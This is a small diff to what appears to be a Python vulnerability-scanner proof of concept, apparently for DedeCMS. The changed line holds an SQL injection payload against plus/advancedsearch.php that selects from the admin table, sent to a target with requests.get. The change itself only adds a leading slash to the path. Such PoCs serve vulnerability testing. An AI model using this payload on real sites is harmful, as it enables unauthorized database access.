@@ -32,7 +32,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             
-            payload = 'plus/advancedsearch.php?mid=1&sql=SELECT%20md5(c)%20FROM%20`%23@__admin`'
+            payload = '/plus/advancedsearch.php?mid=1&sql=SELECT%20md5(c)%20FROM%20`%23@__admin`'
             url = self.target + payload
             r = requests.get(url)
 
